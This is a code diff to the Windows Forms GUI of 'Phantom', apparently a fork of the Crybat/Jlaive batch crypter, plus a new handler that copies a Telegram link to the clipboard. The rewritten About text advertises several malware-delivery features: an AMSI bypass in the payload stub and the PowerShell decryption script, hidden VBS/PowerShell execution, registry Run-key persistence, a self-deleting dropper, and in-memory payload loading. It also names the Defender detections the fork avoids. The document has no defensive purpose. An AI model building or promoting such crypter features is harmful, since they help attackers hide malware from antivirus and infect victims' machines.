@@ -34,33 +34,27 @@ namespace Phantom
             }
             Task.Factory.StartNew(CheckVersion);
             UpdateKeys(sender, e);
+
             aboutTextBox.Text = @"Phantom - Crybat/Jlaive Rewrite
 ================================
 Originally created by C5Hackr
 Modded by Trapwithme
 
-What's different from C5Hackr's original:
-- UAC Bypass removed: HWBP (SetThreadContext+VEH) and
-  VirtualProtect on amsi.dll triggered
-  Behavior:Win32/SuspAmsiPatch.F/K. Cleaner to prompt.
-- AMSI bypass removed: original used Assembly.Load(byte[])
-  which triggered AMSI; this fork uses
-  Assembly.LoadFrom(GetTempFileName) instead.
-- No VBS in startup: Registry Run key points directly to
-  cmd.exe /c batchpath instead of a .vbs launcher (eliminates
-  Trojan:VBS/Runner.LPAA!MTB).
-- AppData-aware self-delete: startup copies in %APPDATA%
-  are never deleted; only the original deployment batch
-  melts itself.
-- Guard-before-admin ordering: VBS guard flag check runs
-  first, so hidden relaunches skip admin elevation entirely
-  (1 UAC prompt instead of cascading).
-- goto instead of if blocks: batch parser doesn't choke on
-  parentheses inside echo CreateObject(...).
-- INT3 VEH AMSI bypass in payload stub and PowerShell
-  decryption script (no HWBP debug registers).
-- Self-relaunch VBS + PowerShell VBS for hidden execution
+New features in this fork:
+- INT3 VEH AMSI bypass in both payload stub and PowerShell
+  decryption script (zero-popup, no debug registers).
+- Self-relaunch VBS + PowerShell VBS hidden execution
   with zero hanging windows.
+- AppData-aware self-delete: startup copies survive in
+  %APPDATA%, original deployment batch melts itself.
+- Guard-before-admin ordering: VBS guard runs first so
+  hidden launches skip admin elevation (1 prompt total).
+- Direct cmd.exe /c registry persistence — no VBS
+  launcher files written to disk for startup.
+- Assembly.Load(byte[]) for in-memory payload loading
+  — nothing written to disk.
+- goto-based batch control flow (no if-block nesting
+  issues with echo CreateObject).
 
 Build: MSBuild Phantom.csproj /p:Configuration=Release
 Output: bin\Release\Phantom.exe
@@ -471,6 +465,13 @@ https://github.com/Trapwithme/Phantom";
 
         private void runas_CheckedChanged(object sender, EventArgs e)
         {
+        }
+
+        private void telegramIcon_Click(object sender, EventArgs e)
+        {
+            string url = "https://t.me/wuved";
+            Clipboard.SetText(url);
+            MessageBox.Show("Telegram link copied to clipboard:\n" + url, "Join Telegram", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
     }
 }
